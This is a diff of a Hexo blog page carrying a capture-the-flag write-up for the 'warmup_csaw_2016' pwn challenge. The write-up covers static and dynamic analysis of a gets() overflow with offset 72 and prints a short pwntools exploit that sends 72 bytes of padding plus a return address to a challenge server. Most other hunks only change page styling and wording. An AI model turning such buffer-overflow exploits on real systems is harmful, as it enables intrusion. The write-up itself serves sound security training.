@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息基本信息64位elf，保护没开                                                                                                             静态分析IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出">
+    <meta name="description" content="题目信息基本信息64位elf，保护没开  静态分析IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出  这个函数就是直接cat flag的函数  那么意图很明显，就是溢出后控制执行这个函数get flag 动态分析gdb中计算出offset为72:  exploit12345678910111213#!&#x2F;usr&#x2F;bin&#x2F;pythonfrom pwn import *sh &#x3D; rem">
 <meta property="og:type" content="article">
 <meta property="og:title" content="warmup_csaw_2016">
 <meta property="og:url" content="https://darkwing.moe/2019/11/10/warmup-csaw-2016/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息基本信息64位elf，保护没开                                                                                                             静态分析IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出">
+<meta property="og:description" content="题目信息基本信息64位elf，保护没开  静态分析IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出  这个函数就是直接cat flag的函数  那么意图很明显，就是溢出后控制执行这个函数get flag 动态分析gdb中计算出offset为72:  exploit12345678910111213#!&#x2F;usr&#x2F;bin&#x2F;pythonfrom pwn import *sh &#x3D; rem">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110402.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110401.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110403.jpg">
@@ -115,8 +115,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -138,7 +145,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -202,42 +209,14 @@
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <h1 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>64位elf，保护没开</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110402.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110402.jpg" alt=""></p>
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110401.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110401.jpg" alt=""></p>
 <p>这个函数就是直接cat flag的函数</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110403.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110403.jpg" alt=""></p>
 <p>那么意图很明显，就是溢出后控制执行这个函数get flag</p>
 <h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>gdb中计算出offset为72:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110404.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019110404.jpg" alt=""></p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28839</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">sh.recvuntil(<span class="string">'WOW:'</span>)</span><br><span class="line">addr = sh.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="comment"># payload = 'A' * 72 + p64(int(addr, 16))</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">72</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">sh.writeline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -250,7 +229,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-11-10T02:33:23.099Z" itemprop="dateUpdated">2019-11-10 10:33:23</time>
+    Last updated: <time datetime="2019-11-10T02:33:23.099Z" itemprop="dateUpdated">2019-11-10 10:33:23</time>
 </span><br>
 
 
@@ -417,11 +396,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
